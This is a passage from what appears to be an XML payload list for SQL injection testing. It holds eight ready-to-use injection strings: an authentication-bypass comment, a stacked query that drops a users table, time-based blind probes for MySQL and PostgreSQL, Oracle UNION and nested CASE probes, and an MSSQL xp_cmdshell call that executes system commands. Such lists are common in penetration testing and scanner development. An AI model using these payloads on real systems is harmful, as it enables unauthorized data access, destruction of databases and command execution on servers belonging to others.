    <PAYLOAD id="3" type="comment">admin'--</PAYLOAD>
    <PAYLOAD id="4" type="stacked">'; DROP TABLE users; --</PAYLOAD>
    <PAYLOAD id="5" type="timeblind">1' AND SLEEP(5)--</PAYLOAD>
    <PAYLOAD id="6" type="mssql">'; EXEC xp_cmdshell 'dir'--</PAYLOAD>
    <PAYLOAD id="7" type="postgres">1' AND (SELECT pg_sleep(5))--</PAYLOAD>
    <PAYLOAD id="8" type="mysql">1' AND BENCHMARK(10000000,MD5(1))--</PAYLOAD>
    <PAYLOAD id="9" type="oracle">1' AND rownum=1 UNION SELECT NULL FROM dual--</PAYLOAD>
    <PAYLOAD id="10" type="nested">1' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END FROM users)--</PAYLOAD>
